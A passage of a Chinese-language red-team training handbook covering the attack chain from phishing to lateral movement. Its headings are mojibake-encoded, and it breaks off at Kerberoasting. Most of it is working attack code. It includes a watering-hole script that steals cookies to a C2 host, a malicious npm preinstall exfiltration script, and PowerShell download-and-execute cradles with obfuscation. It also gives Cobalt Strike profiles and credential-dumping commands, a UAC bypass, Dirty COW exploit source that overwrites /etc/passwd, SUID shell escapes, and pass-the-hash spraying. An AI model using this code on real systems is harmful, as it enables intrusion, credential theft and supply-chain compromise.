<h2 id="æ¨¡å—äºŒçº¢é˜Ÿä½œæˆ˜ä½“ç³»"><a class="header" href="#æ¨¡å—äºŒçº¢é˜Ÿä½œæˆ˜ä½“ç³»">æ¨¡å—äºŒï¼šçº¢é˜Ÿä½œæˆ˜ä½“ç³»</a></h2>
<h3 id="æ¨¡å—æ€»è§ˆçº¢é˜Ÿè§†è§’"><a class="header" href="#æ¨¡å—æ€»è§ˆçº¢é˜Ÿè§†è§’">æ¨¡å—æ€»è§ˆï¼ˆçº¢é˜Ÿè§†è§’ï¼‰</a></h3>
<ul>
<li><strong>æ ¸å¿ƒç›®æ ‡</strong>ï¼šæŒæ¡ç°ä»£çº¢é˜Ÿä»ä¾¦å¯Ÿã€æ­¦å™¨åŒ–ã€æŠ•é€’ã€æ‰§è¡Œåˆ°è¡ŒåŠ¨ç»´æŒçš„å®Œæ•´é“¾è·¯ï¼Œèƒ½å¤Ÿæ ¹æ®ä¸åŒä¼ä¸šåœºæ™¯åˆ¶å®šå¯æ§ã€å¯å¤ç°çš„æ”»å‡»å‰§æœ¬ã€‚</li>
<li><strong>å…³é”®èƒ½åŠ›ç‚¹</strong>ï¼š
<ul>
<li>Kill Chain å¯¹é½ï¼šRecon â†’ Initial Access â†’ Privilege Escalation â†’ Lateral Movement â†’ Action on Objectiveã€‚</li>
<li>å·¥å…·ä¸è‡ªç ”ç»“åˆï¼šç†Ÿæ‚‰ä¸»æµC2å¹³å°ã€è„šæœ¬æ¡†æ¶ä¸è‡ªç ”æ¨¡å—ï¼Œå…·å¤‡å¿«é€Ÿå®šåˆ¶èƒ½åŠ›ã€‚</li>
<li>éšè”½ä¸å¯¹æŠ—ï¼šæŒæ¡æµé‡æ··æ·†ã€ç‰¹å¾è§„é¿ã€æ—¥å¿—æ¸…æ´—ç­‰éšè”½æŠ€å·§ã€‚</li>
</ul>
</li>
<li><strong>äº¤ä»˜æ¸…å•</strong>ï¼šçº¢é˜Ÿä½œæˆ˜æ‰‹å†Œã€æ”»å‡»è·¯å¾„å›¾ã€POC/EXPä»£ç åº“ã€é£é™©è¯„ä¼°ä¸ç¼“è§£å»ºè®®ã€è¯æ®å½’é›†è¡¨ã€‚</li>
</ul>
<h4 id="çº¢é˜Ÿä½œæˆ˜åŸºçº¿red-team-baseline"><a class="header" href="#çº¢é˜Ÿä½œæˆ˜åŸºçº¿red-team-baseline">çº¢é˜Ÿä½œæˆ˜åŸºçº¿ï¼ˆRed Team Baselineï¼‰</a></h4>
<div class="table-wrapper"><table><thead><tr><th>ç»´åº¦</th><th>åŸºç¡€è¦æ±‚</th><th>è¿›é˜¶è¦æ±‚</th><th>ä¸“å®¶è¦æ±‚</th></tr></thead><tbody>
<tr><td>æƒ…æŠ¥å‡†å¤‡</td><td>èµ„äº§æŒ‡çº¹ã€æ¼æ´æƒ…æŠ¥åˆ—è¡¨</td><td>èåˆå¨èƒæƒ…æŠ¥ã€è¡Œä¸šæ¡ˆä¾‹</td><td>æ„å»ºæƒ…æŠ¥ç®¡é“ã€åˆ†æå¯¹æ‰‹TTP</td></tr>
<tr><td>C2åŸºç¡€è®¾æ–½</td><td>å•èŠ‚ç‚¹C2ã€HTTPé€šé“</td><td>å¤šèŠ‚ç‚¹C2ã€æ··åˆåè®®ã€åŸŸå‰ç½®</td><td>åŠ¨æ€åŸŸå‰ç½®ã€CDNæ··æ·†ã€Cloud C2</td></tr>
<tr><td>å·¥å…·é“¾</td><td>ç†Ÿæ‚‰å…¬å¼€å·¥å…·ã€æŒæ¡é…ç½®</td><td>å®šåˆ¶Payloadã€è„šæœ¬åŒ–æµç¨‹</td><td>è‡ªç ”æ¡†æ¶ã€åæº¯æºæœºåˆ¶</td></tr>
<tr><td>éšè”½æ€§</td><td>åŸºç¡€æ··æ·†ã€æ—¥å¿—æ¸…ç†</td><td>æµé‡ä¼ªè£…ã€è¯æ®æœ€å°åŒ–</td><td>å¯¹æŠ—EDR/IPSã€åæŒ‡çº¹è¿½è¸ª</td></tr>
<tr><td>å¤ç›˜èƒ½åŠ›</td><td>ç®€å•æŠ¥å‘Š</td><td>é“¾è·¯å¤ç›˜+å½±å“è¯„ä¼°</td><td>æ•°æ®é©±åŠ¨æ”»é˜²æŒ‡æ ‡ã€ç°ç›’éªŒè¯</td></tr>
</tbody></table>
</div>
<blockquote>
<p><strong>æç¤º</strong>ï¼šçº¢é˜Ÿå¿…é¡»éµå®ˆâ€œå¯æ§æ€§â€â€œå¯å›æ»šâ€â€œå¯å®¡è®¡â€ä¸‰å¤§åŸåˆ™ï¼Œæ¼”ç»ƒä¸­å¯¹æ¯ä¸ªé«˜å±æ­¥éª¤è®¾ç½®â€œå®‰å…¨é˜ˆå€¼â€ä¸â€œç´§æ€¥æŒ‰é’®â€ã€‚</p>
</blockquote>
<h3 id="21-åˆå§‹è®¿é—®æŠ€æœ¯"><a class="header" href="#21-åˆå§‹è®¿é—®æŠ€æœ¯">2.1 åˆå§‹è®¿é—®æŠ€æœ¯</a></h3>
<h4 id="é’“é±¼æ”»å‡»phishing"><a class="header" href="#é’“é±¼æ”»å‡»phishing">é’“é±¼æ”»å‡»ï¼ˆPhishingï¼‰</a></h4>
<p><strong>é‚®ä»¶é’“é±¼</strong>:</p>
<pre><code class="language-python"># é’“é±¼é‚®ä»¶ç”Ÿæˆè„šæœ¬ï¼ˆä»…ç”¨äºæˆæƒæ¼”ç»ƒï¼‰
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

class PhishingCampaign:
    def __init__(self, smtp_server, smtp_port):
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port

    def create_template(self, target_name, company):
        """
        åˆ›å»ºä¸ªæ€§åŒ–é’“é±¼é‚®ä»¶æ¨¡æ¿
        """
        template = f"""
        å°Šæ•¬çš„{target_name}ï¼Œ

        æ‚¨çš„{company}è´¦æˆ·éœ€è¦éªŒè¯ã€‚è¯·ç‚¹å‡»ä»¥ä¸‹é“¾æ¥å®ŒæˆéªŒè¯ï¼š

        https://phishing-domain.com/verify?user={target_name}

        æ­¤é“¾æ¥å°†åœ¨24å°æ—¶åå¤±æ•ˆã€‚

        {company}å®‰å…¨å›¢é˜Ÿ
        """
        return template

    def attach_malicious_macro(self, filename):
        """
        é™„åŠ æ¶æ„å®æ–‡æ¡£ï¼ˆæ¼”ç»ƒç”¨ï¼‰
        """
        # ç”ŸæˆåŒ…å«å®çš„Officeæ–‡æ¡£
        # å®é™…ä»£ç ç•¥ï¼Œéœ€è¦ä½¿ç”¨python-docxç­‰åº“
        pass

    def track_email_open(self, email_id):
        """
        è·Ÿè¸ªé‚®ä»¶æ‰“å¼€æƒ…å†µ
        """
        tracking_pixel = f'&lt;img src="https://tracker.com/pixel.gif?id={email_id}" width="1" height="1" /&gt;'
        return tracking_pixel

# Gophishé’“é±¼å¹³å°ä½¿ç”¨
"""
1. å®‰è£…Gophish
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
./gophish

2. è®¿é—®ç®¡ç†ç•Œé¢
https://localhost:3333

3. åˆ›å»ºé’“é±¼æ´»åŠ¨
- ç”¨æˆ·ç»„ï¼šå¯¼å…¥ç›®æ ‡é‚®ç®±åˆ—è¡¨
- é‚®ä»¶æ¨¡æ¿ï¼šè®¾è®¡é’“é±¼é‚®ä»¶
- ç€é™†é¡µï¼šå…‹éš†çœŸå®ç™»å½•é¡µé¢
- å‘é€é…ç½®ï¼šSMTPæœåŠ¡å™¨è®¾ç½®

4. ç›‘æ§ç»“æœ
- é‚®ä»¶å‘é€çŠ¶æ€
- æ‰“å¼€ç‡
- ç‚¹å‡»ç‡
- å‡­è¯æäº¤ç‡
"""
</code></pre>
<p><strong>æ°´å‘æ”»å‡»ï¼ˆWatering Holeï¼‰</strong>:</p>
<pre><code class="language-javascript">// æ°´å‘æ”»å‡»æ¤å…¥è„šæœ¬
(function() {
    // æ£€æµ‹ç›®æ ‡ç”¨æˆ·
    var targetCompany = 'target-company.com';
    var userDomain = document.referrer;

    if (userDomain.includes(targetCompany)) {
        // åŠ è½½æ¶æ„è½½è·
        var script = document.createElement('script');
        script.src = 'https://malicious-cdn.com/payload.js';
        document.head.appendChild(script);

        // ä¿¡æ¯æ”¶é›†
        var info = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            cookies: document.cookie,
            referrer: document.referrer
        };

        // å›ä¼ ä¿¡æ¯
        fetch('https://c2-server.com/collect', {
            method: 'POST',
            body: JSON.stringify(info)
        });
    }
})();
</code></pre>
<h4 id="ä¾›åº”é“¾æ”»å‡»"><a class="header" href="#ä¾›åº”é“¾æ”»å‡»">ä¾›åº”é“¾æ”»å‡»</a></h4>
<p><strong>è½¯ä»¶ä¾›åº”é“¾å…¥ä¾µ</strong>:</p>
<pre><code class="language-bash"># npmåŒ…æŠ•æ¯’ç¤ºä¾‹ï¼ˆä»…ç”¨äºç†è§£åŸç†ï¼‰
# package.json
{
  "name": "popular-package-typo",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "node malicious-script.js"
  }
}

# malicious-script.js
const https = require('https');
const os = require('os');

// æ”¶é›†ç³»ç»Ÿä¿¡æ¯
const systemInfo = {
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    user: process.env.USER || process.env.USERNAME,
    cwd: process.cwd()
};

// å›ä¼ åˆ°C2æœåŠ¡å™¨
const data = JSON.stringify(systemInfo);
const options = {
    hostname: 'c2-server.com',
    port: 443,
    path: '/collect',
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Content-Length': data.length
    }
};

const req = https.request(options);
req.write(data);
req.end();
</code></pre>
<h3 id="æ”»å‡»é“¾ç­–åˆ’å·¥ä½œåŠkill-chain-workshop"><a class="header" href="#æ”»å‡»é“¾ç­–åˆ’å·¥ä½œåŠkill-chain-workshop">æ”»å‡»é“¾ç­–åˆ’å·¥ä½œåŠï¼ˆKill Chain Workshopï¼‰</a></h3>
<ol>
<li><strong>æƒ…æŠ¥æ”¶æ•›</strong>ï¼šç»“åˆShodanã€Fofaã€Gitæ³„éœ²ã€äººå‘˜ç¤¾äº¤åª’ä½“ã€æ‹›è˜ä¿¡æ¯ç¡®å®šæŠ€æœ¯æ ˆä¸æ½œåœ¨å…¥å£ã€‚</li>
<li><strong>å…¥å£æ’åˆ—</strong>ï¼šä¾æ®æ”»å‡»æ”¶ç›Šã€æŠ•å…¥æˆæœ¬ã€è¢«å‘ç°æ¦‚ç‡æ‰“åˆ†ï¼Œå½¢æˆâ€œå…¥å£ä¼˜å…ˆçº§çŸ©é˜µï¼ˆä»·å€¼ Ã— éšè”½ Ã— æˆæœ¬ï¼‰â€ã€‚</li>
<li><strong>è¡ŒåŠ¨è„šæœ¬</strong>ï¼šä¸ºæ¯ä¸ªå…¥å£ç¼–å†™è¡ŒåŠ¨è„šæœ¬ï¼ŒåŒ…å«å‰ææ¡ä»¶ã€å·¥å…·ã€å‘½ä»¤ã€å›æ»šæ­¥éª¤ã€å¯èƒ½è§¦å‘çš„å‘Šè­¦ç‚¹ã€‚</li>
<li><strong>å®‰å…¨é˜€è®¾ç½®</strong>ï¼šå®šä¹‰æ¯ä¸ªé˜¶æ®µçš„æ½œåœ¨å½±å“ï¼ˆä¸šåŠ¡ã€æ•°æ®ã€èˆ†æƒ…ï¼‰ï¼Œä¸€æ—¦è§¦å‘é˜ˆå€¼ç«‹å³é€šçŸ¥ç™½é˜Ÿè¯„ä¼°æ˜¯å¦ä¸­æ­¢ã€‚</li>
<li><strong>è¯æ®ç­–ç•¥</strong>ï¼šå…¨ç¨‹ä½¿ç”¨åŠ å¯†æ—¥å¿—ã€è‡ªå®šä¹‰è„šæœ¬è‡ªåŠ¨è®°å½•å‘½ä»¤ã€æ—¶é—´æˆ³ã€ç›®æ ‡ï¼Œç¡®ä¿å›æº¯æ€§ã€‚</li>
</ol>
<blockquote>
<p>å»ºè®®åˆ©ç”¨ç™½æ¿æˆ–Miroç»˜åˆ¶æ”»å‡»é“¾å›¾ï¼ˆChain of Attackï¼‰ï¼Œæ ‡æ³¨å¯¹åº”çš„MITREæŠ€æœ¯ç¼–å·ä¸è“é˜Ÿé¢„æœŸå‘Šè­¦ç‚¹ã€‚</p>
</blockquote>
<h3 id="22-æ‰§è¡ŒæŠ€æœ¯"><a class="header" href="#22-æ‰§è¡ŒæŠ€æœ¯">2.2 æ‰§è¡ŒæŠ€æœ¯</a></h3>
<h4 id="powershellæ”»å‡»"><a class="header" href="#powershellæ”»å‡»">PowerShellæ”»å‡»</a></h4>
<p><strong>æ— æ–‡ä»¶æ”»å‡»ï¼ˆFileless Attackï¼‰</strong>:</p>
<pre><code class="language-powershell"># å†…å­˜æ‰§è¡ŒPowerShellè„šæœ¬
IEX (New-Object Net.WebClient).DownloadString('http://c2-server.com/payload.ps1')

# Base64ç¼–ç æ‰§è¡Œ
$command = 'IEX (New-Object Net.WebClient).DownloadString("http://c2-server.com/payload.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encodedCommand

# Empireæ¡†æ¶ä½¿ç”¨
"""
# å®‰è£…Empire
git clone https://github.com/EmpireProject/Empire.git
cd Empire
./setup/install.sh
./empire

# åˆ›å»ºç›‘å¬å™¨
(Empire) &gt; listeners
(Empire: listeners) &gt; uselistener http
(Empire: listeners/http) &gt; set Host http://192.168.1.100
(Empire: listeners/http) &gt; set Port 8080
(Empire: listeners/http) &gt; execute

# ç”ŸæˆLauncher
(Empire: listeners) &gt; launcher powershell http
(Empire: listeners) &gt; usestager windows/launcher_bat
(Empire: stager/windows/launcher_bat) &gt; set Listener http
(Empire: stager/windows/launcher_bat) &gt; execute

# åæ¸—é€æ¨¡å—
(Empire: agents) &gt; usemodule privesc/powerup/allchecks
(Empire: agents) &gt; usemodule credentials/mimikatz/logonpasswords
(Empire: agents) &gt; usemodule lateral_movement/invoke_psremoting
"""
</code></pre>
<p><strong>æ··æ·†æŠ€æœ¯</strong>:</p>
<pre><code class="language-powershell"># Invoke-Obfuscationå·¥å…·
Import-Module .\Invoke-Obfuscation.psd1
Invoke-Obfuscation

# åŠ è½½è„šæœ¬
SET SCRIPTBLOCK IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')

# Tokenæ··æ·†
TOKEN
ALL
1

# å­—ç¬¦ä¸²æ··æ·†
STRING
1

# ç¼–ç æ··æ·†
ENCODING
1

# æŸ¥çœ‹æ··æ·†ç»“æœ
OUT obfuscated.ps1
</code></pre>
<h4 id="cobalt-strikeä½¿ç”¨"><a class="header" href="#cobalt-strikeä½¿ç”¨">Cobalt Strikeä½¿ç”¨</a></h4>
<p><strong>Beaconé…ç½®</strong>:</p>
<pre><code class="language-bash"># å¯åŠ¨å›¢é˜ŸæœåŠ¡å™¨
./teamserver [external IP] [password] [/path/to/malleable-c2-profile]

# Malleable C2 Profileé…ç½®
set sample_name "Custom Profile";

set sleeptime "60000";
set jitter    "20";

http-get {
    set uri "/api/v1/status";

    client {
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
        header "Accept" "application/json";

        metadata {
            base64url;
            prepend "session=";
            header "Cookie";
        }
    }

    server {
        header "Content-Type" "application/json";
        header "Server" "nginx/1.18.0";

        output {
            base64url;
            prepend "{\"status\":\"ok\",\"data\":\"";
            append "\"}";
            print;
        }
    }
}

http-post {
    set uri "/api/v1/update";

    client {
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
        header "Content-Type" "application/json";

        id {
            base64url;
            prepend "{\"id\":\"";
            append "\",";
        }

        output {
            base64url;
            prepend "\"data\":\"";
            append "\"}";
            print;
        }
    }

    server {
        header "Content-Type" "application/json";

        output {
            base64url;
            prepend "{\"response\":\"";
            append "\"}";
            print;
        }
    }
}
</code></pre>
<h4 id="c2åŸºç¡€è®¾æ–½è“å›¾"><a class="header" href="#c2åŸºç¡€è®¾æ–½è“å›¾">C2åŸºç¡€è®¾æ–½è“å›¾</a></h4>
<pre><code>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   å¤–éƒ¨åŸºç¡€è®¾æ–½ (Cloud / VPS)                â”‚
â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚
â”‚   â”‚ Redirector A â”‚--&gt;| CDN / WAF / NLB  â”‚----â”â”‚
â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚â”‚
â”‚                â”‚            â”‚                â”‚â”‚
â”‚   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”        â”‚â”‚
â”‚   â”‚ Redirector B â”‚   â”‚ Redirector C â”‚        â”‚â”‚
â”‚   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜        â”‚â”‚
â”‚                â”‚            â”‚                â”‚â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚
                 â”‚            â”‚                 â”‚
       â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”       â”‚
       â”‚ å†…éƒ¨C2æ ¸å¿ƒ (Team Server/VPS)   â”‚&lt;â”€â”€â”€â”€â”€â”€â”€â”˜
       â”‚  - æ­£å¼Beaconç›‘å¬ç«¯å£         â”‚
       â”‚  - æ“ä½œå‘˜VPN/Jumpä¸»æœº         â”‚
       â”‚  - æ—¥å¿—ä¸è¯æ®å­˜å‚¨             â”‚
       â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                 â”‚
      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
      â”‚ æ“ä½œå‘˜å·¥ä½œç«™ (OPSEC)â”‚
      â”‚  - éš”ç¦»ç½‘ç»œ         â”‚
      â”‚  - å¤šå› å­è®¤è¯       â”‚
      â”‚  - å·¥å…·ç™½åå•       â”‚
      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>è®¾è®¡åŸåˆ™</strong>ï¼š</p>
<ul>
<li>ä½¿ç”¨å¤šè·³åå‘ä»£ç†ä¸CDNéšè—çœŸå®C2åœ°å€ï¼Œç»“åˆåŸŸå‰ç½®æˆ–SNIä¼ªè£…ï¼›</li>
<li>Redirector ä¸æ ¸å¿ƒC2åˆ†ç¦»ï¼Œå‡ºç°å°ç¦å¯å¿«é€Ÿæ›¿æ¢ï¼›</li>
<li>é€šè¿‡WireGuard/OpenVPNç®¡ç†å¹³é¢è®¿é—®ï¼Œæ‰€æœ‰å‘½ä»¤ç»ç”±å ¡å’æœºå®¡è®¡ï¼›</li>
<li>C2æœåŠ¡é‡‡ç”¨å®¹å™¨åŒ–æˆ–åŸºç¡€è®¾æ–½å³ä»£ç ï¼ˆTerraform/Ansibleï¼‰å¿«é€Ÿéƒ¨ç½²ä¸é”€æ¯ï¼›</li>
<li>å»ºç«‹â€œæ“ä½œå‘˜æ‰‹å†Œâ€ï¼šåŒ…æ‹¬ä¸Šçº¿å®¡æ‰¹ã€å‘½ä»¤å®¡æ‰¹ã€è¯æ®åŒæ­¥ã€å›æ»šæ­¥éª¤ã€‚</li>
</ul>
<p><strong>åæ¸—é€æ“ä½œ</strong>:</p>
<pre><code class="language-bash"># Beaconå‘½ä»¤
beacon&gt; shell whoami
beacon&gt; getuid
beacon&gt; ps
beacon&gt; screenshot

# æƒé™æå‡
beacon&gt; elevate svc-exe tcp-local
beacon&gt; getsystem

# å‡­è¯è·å–
beacon&gt; hashdump
beacon&gt; logonpasswords
beacon&gt; mimikatz !sekurlsa::logonpasswords

# æ¨ªå‘ç§»åŠ¨
beacon&gt; jump psexec target.com LISTENER
beacon&gt; jump winrm target.com LISTENER
beacon&gt; remote-exec psexec target.com whoami

# æŒä¹…åŒ–
beacon&gt; run persistence
beacon&gt; schtasks /create /tn "WindowsUpdate" /tr "C:\backdoor.exe" /sc onlogon /ru System

# éš§é“å»ºç«‹
beacon&gt; socks 1080
beacon&gt; rportfwd 8080 127.0.0.1 80
</code></pre>
<h3 id="23-æƒé™æå‡"><a class="header" href="#23-æƒé™æå‡">2.3 æƒé™æå‡</a></h3>
<h4 id="windowsæƒé™æå‡"><a class="header" href="#windowsæƒé™æå‡">Windowsæƒé™æå‡</a></h4>
<p><strong>UACç»•è¿‡æŠ€æœ¯</strong>:</p>
<pre><code class="language-powershell"># fodhelper.exe UACç»•è¿‡ï¼ˆWin10ï¼‰
function Invoke-FodhelperBypass {
    param([String]$Command)

    # åˆ›å»ºæ³¨å†Œè¡¨é¡¹
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $Command -Force

    # è§¦å‘UACç»•è¿‡
    Start-Process "C:\Windows\System32\fodhelper.exe"

    # æ¸…ç†ç—•è¿¹
    Start-Sleep -Seconds 3
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
}

# ä½¿ç”¨ç¤ºä¾‹
Invoke-FodhelperBypass -Command "powershell.exe -NoP -W Hidden -Exec Bypass -File C:\backdoor.ps1"
</code></pre>
<p><strong>æœåŠ¡æƒé™æ»¥ç”¨</strong>:</p>
<pre><code class="language-powershell"># PowerUpæšä¸¾
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# å¯æ»¥ç”¨çš„æœåŠ¡ç±»å‹
function Find-VulnerableServices {
    # 1. UnquotedæœåŠ¡è·¯å¾„
    Get-WmiObject -Class Win32_Service | Where-Object {
        $_.PathName -notmatch '^"' -and
        $_.PathName -match ' ' -and
        $_.StartMode -eq 'Auto'
    } | Select-Object Name, PathName, StartMode, State

    # 2. å¯å†™æœåŠ¡äºŒè¿›åˆ¶
    Get-ServiceUnquoted | Where-Object {
        Test-Path $_.Path -PathType Leaf
    } | ForEach-Object {
        $acl = Get-Acl $_.Path
        if ($acl.Access | Where-Object {
            $_.FileSystemRights -match 'Write|FullControl' -and
            $_.IdentityReference -match 'Users|Everyone'
        }) {
            $_.Name
        }
    }

    # 3. å¯ä¿®æ”¹æœåŠ¡é…ç½®
    Get-Service | ForEach-Object {
        $svc = $_
        $acl = Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\$($svc.Name)"
        if ($acl.Access | Where-Object {
            $_.RegistryRights -match 'Write|FullControl' -and
            $_.IdentityReference -match 'Users|Everyone'
        }) {
            $svc.Name
        }
    }
}

# åˆ©ç”¨unquotedæœåŠ¡è·¯å¾„
# æœåŠ¡è·¯å¾„: C:\Program Files\Vulnerable Service\service.exe
# å°è¯•åˆ›å»º: C:\Program.exe
Copy-Item backdoor.exe "C:\Program.exe"
Restart-Service VulnerableService
</code></pre>
<h4 id="linuxæƒé™æå‡"><a class="header" href="#linuxæƒé™æå‡">Linuxæƒé™æå‡</a></h4>
<p><strong>å†…æ ¸æ¼æ´åˆ©ç”¨</strong>:</p>
<pre><code class="language-bash">#!/bin/bash
# Dirty COW (CVE-2016-5195) åˆ©ç”¨è„šæœ¬

# æ£€æŸ¥å†…æ ¸ç‰ˆæœ¬
uname -r
# æ˜“å—å½±å“ç‰ˆæœ¬: Linux 2.6.22 - 4.8.3

# ç¼–è¯‘exploit
cat &gt; dirtycow.c &lt;&lt; 'EOF'
#include &lt;stdio.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;pthread.h&gt;
#include &lt;string.h&gt;

void *map;
int f;
struct stat st;
char *name;

void *madviseThread(void *arg) {
    char *str = (char *)arg;
    int i, c = 0;
    for(i = 0; i &lt; 100000000; i++) {
        c += madvise(map, 100, MADV_DONTNEED);
    }
}

void *procselfmemThread(void *arg) {
    char *str = (char *)arg;
    int f = open("/proc/self/mem", O_RDWR);
    int i, c = 0;
    for(i = 0; i &lt; 100000000; i++) {
        lseek(f, (uintptr_t) map, SEEK_SET);
        c += write(f, str, strlen(str));
    }
}

int main(int argc, char *argv[]) {
    pthread_t pth1, pth2;
    f = open(argv[1], O_RDONLY);
    fstat(f, &amp;st);
    name = argv[1];
    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);

    pthread_create(&amp;pth1, NULL, madviseThread, argv[2]);
    pthread_create(&amp;pth2, NULL, procselfmemThread, argv[2]);

    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);
    return 0;
}
EOF

gcc -pthread dirtycow.c -o dirtycow
./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash'
</code></pre>
<p><strong>SUIDæ»¥ç”¨</strong>:</p>
<pre><code class="language-bash"># æŸ¥æ‰¾æ‰€æœ‰SUIDç¨‹åº
find / -perm -4000 -type f 2&gt;/dev/null

# GTFOBinsæ»¥ç”¨ç¤ºä¾‹
# vim SUIDææƒ
vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# find SUIDææƒ
find . -exec /bin/sh -p \; -quit

# nmap SUIDææƒï¼ˆæ—§ç‰ˆæœ¬ï¼‰
nmap --interactive
!sh

# python SUIDææƒ
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# perl SUIDææƒ
perl -e 'exec "/bin/sh";'

# awk SUIDææƒ
awk 'BEGIN {system("/bin/sh")}'
</code></pre>
<h3 id="24-æ¨ªå‘ç§»åŠ¨"><a class="header" href="#24-æ¨ªå‘ç§»åŠ¨">2.4 æ¨ªå‘ç§»åŠ¨</a></h3>
<h4 id="pass-the-hashæ”»å‡»"><a class="header" href="#pass-the-hashæ”»å‡»">Pass-the-Hashæ”»å‡»</a></h4>
<p><strong>Impacketå·¥å…·é›†</strong>:</p>
<pre><code class="language-bash"># ä½¿ç”¨NTLMå“ˆå¸Œè¿›è¡Œæ¨ªå‘ç§»åŠ¨

# PsExec
psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.1.10

# WMIExec
wmiexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.1.10

# SMBExec
smbexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.1.10

# AtExecï¼ˆè®¡åˆ’ä»»åŠ¡ï¼‰
atexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.1.10 "whoami"

# DCOMExec
dcomexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.1.10

# æå–å“ˆå¸Œ
secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.1.10
</code></pre>
<p><strong>CrackMapExecæ‰¹é‡æ”»å‡»</strong>:</p>
<pre><code class="language-bash"># å®‰è£…CrackMapExec
pipx install crackmapexec

# æ‰¹é‡å¯†ç å–·æ´’
crackmapexec smb 192.168.1.0/24 -u administrator -p 'Password123!'

# Pass-the-Hashæ‰¹é‡
crackmapexec smb 192.168.1.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# æ‰¹é‡æ‰§è¡Œå‘½ä»¤
crackmapexec smb 192.168.1.0/24 -u administrator -H hash -x "whoami"

# æå–SAM
crackmapexec smb 192.168.1.10 -u administrator -H hash --sam

# æå–LSA Secrets
crackmapexec smb 192.168.1.10 -u administrator -H hash --lsa

# æšä¸¾å…±äº«
crackmapexec smb 192.168.1.0/24 -u administrator -H hash --shares

# æšä¸¾ç™»å½•ç”¨æˆ·
crackmapexec smb 192.168.1.0/24 -u administrator -H hash --lusers

# æ¨¡å—ä½¿ç”¨
crackmapexec smb 192.168.1.10 -u administrator -H hash -M mimikatz
crackmapexec smb 192.168.1.10 -u administrator -H hash -M lsassy
</code></pre>
<h4 id="kerberosæ”»å‡»"><a class="header" href="#kerberosæ”»å‡»">Kerberosæ”»å‡»</a></h4>
<p><strong>Kerberoasting</strong>:</p>
<pre><code class="language-powershell"># PowerViewæšä¸¾SPNè´¦æˆ·
Import-Module .\PowerView.ps1
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# è¯·æ±‚æœåŠ¡ç¥¨æ®
